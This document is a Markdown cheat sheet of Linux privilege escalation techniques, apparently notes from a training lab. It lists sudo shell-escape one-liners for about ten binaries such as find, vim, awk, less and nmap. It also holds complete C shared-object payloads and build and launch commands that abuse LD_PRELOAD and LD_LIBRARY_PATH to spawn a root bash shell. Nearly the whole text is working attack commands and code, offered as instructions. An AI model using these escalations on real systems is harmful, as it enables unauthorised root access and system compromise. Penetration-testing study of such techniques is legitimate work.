# GTFObins

- `sudo -l`

## sudo - shell escape sequences
-  If you have the permissions to run the following commands as root, then this is how you can gain a root shell.
- iftop -  `sudo iftop; !sh`
- find - `sudo find . -exec /bin/sh \; -quit`
- nano - `sudo nano; ^R ^X reset;sh 1>&0 2>&0`
- vim - `sudo vim; :!sh`
- man - `sudo man man; :!sh` or `sudo man man; :!/bin/bash`
- awk - `sudo awk 'BEGIN {system("/bin/sh")}'`
- less - `sudo less /etc/profile; :!sh`
- ftp - `sudo ftp; !sh`
- nmap - `sudo nmap --interactive; !sh`
- more - `TERM=sudo more /etc/profile; !/bin/bash`

## sudo - environmental variables
- sudo can be configured to inherit certain environmental variables from the user's environment.
- Type in `sudo -l` & check for `env_keep` options
```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~$ 

```
- `LD_PRELOAD` loads a shared object before any others when a program is run.
- `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.
- create a shared object using the code at `/home/user/tools/sudo/preload.c`
- creating a shared object command - `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
- preload.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
- `sudo LD_PRELOAD=/tmp/preload.so nmap`
- Run `ldd apache2` to see which shared libraries are used by the program.
```
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fffb99dd000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f104cc50000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f104ca2c000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f104c7f2000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f104c5d6000)
        libc.so.6 => /lib/libc.so.6 (0x00007f104c26a000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f104c065000)
        librt.so.1 => /lib/librt.so.1 (0x00007f104be5d000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f104bc26000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f104ba21000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f104b7f9000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f104d10d000)
user@debian:~$ 
```
- create a shared object mimicking one of the above shared listed libraries using the code at `/home/user/tools/sudo/library_path.c`
- library_path.c
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
- `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`
- And now launch the apache2 with sudo as follows, `sudo LD_LIBRARY_PATH=/tmp apache2`, and this must give you a root shell 


## References
- [tools](./tools)
